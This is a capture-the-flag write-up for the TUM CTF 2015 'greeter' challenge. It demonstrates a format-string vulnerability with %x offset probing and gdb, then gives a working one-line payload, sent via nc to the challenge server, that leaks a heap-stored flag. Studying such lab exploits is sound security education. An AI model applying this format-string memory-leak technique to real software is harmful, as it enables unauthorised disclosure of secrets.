hxp{f0rm4t_sTr1ngs_r0ck}
[](ctf=tum-ctf-teaser-2015)
[](type=pwn)
[](tags=format-string)

#greeter (pwn 15)

```bash
$ file ./greeter
./greeter: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2657dbbc9fbf7a266d2d963b4644d1c3b44d8304, not stripped
```
So we have a not stripped file.

```bash
$ ./greeter 
Hi, what's your name?
AAAAA
Pwn harder, AAAAA!
```
We can send in a name. It suffers form format string vulnerability.
```
$ ./greeter 
Hi, what's your name?
%x.%x
Pwn harder, b5eeae30.7227d7a0!
```
A little bit of analysis shows that the file reads in flag.txt to an address called flag which is not on the stack. Its on the heap. Since it is not on the stack we can't use repeated %x to read it. Also since the file is not stripped we can see the locations of each variable.
```bash
gdb-peda$ p &flag 
$1 = (char (*)[256]) 0x600ca0 <flag>
```

%s is a format specifier that prints out a string ftarting from a given pointer.
Now just figure out the offset.

```bash
$ python -c 'print "%x%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.AAAA"' | ./greeter 
Hi, what's your name?
Pwn harder, ffa0b88010c3b7a0.1096f620.10e32700.78252e78.78257825.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.41414141.0.0.0.0.0.0.AAAA!
````

Payload format:
> format_string+p64(address)

```
>>> p64(0x600ca0)
'\xa0\x0c`\x00\x00\x00\x00\x00'
```

Finally
```bash
$ python -c 'print "%x%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%s.%x.%x.%x.%x.%x.%x.\xa0\x0c`\x00\x00\x00\x00\x00"' | nc 1.ctf.link 1030
Hi, what's your name?
Pwn harder, 720fe23030bcc7a0.30900620.30dea700.78252e78.78257825.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.hxp{f0rm4t_sTr1ngs_r0ck}
.a.0.0.0.0.0.�
              `!
```

Flag
> hxp{f0rm4t_sTr1ngs_r0ck}